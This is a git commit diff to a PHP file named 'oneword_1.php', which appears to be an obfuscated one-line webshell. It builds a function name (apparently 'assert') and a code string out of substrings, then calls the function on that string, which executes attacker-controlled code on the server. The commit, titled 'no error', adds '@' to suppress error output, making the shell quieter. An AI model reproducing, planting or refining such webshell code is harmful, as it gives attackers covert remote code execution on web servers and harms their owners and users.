ab1275dfad0f963cd075d10bc019e5f560239a6c
root <root@localhost.localdomain>
2018-03-26 06:28:35 -0400

    no error

--- php/oneword_1.php
+++ php/oneword_1.php
@@ -14,4 +14,4 @@ $evf=$evf.substr($str,strpos($str,'l'),6);
 $evf=$evf.substr($str,strpos($str,'T'),8);
 $fu=substr($str,strpos($str,'as'),4);
 $fu=$fu.substr($str,strpos($str,'r'),2);
-$fu($evf);
+@$fu($evf);
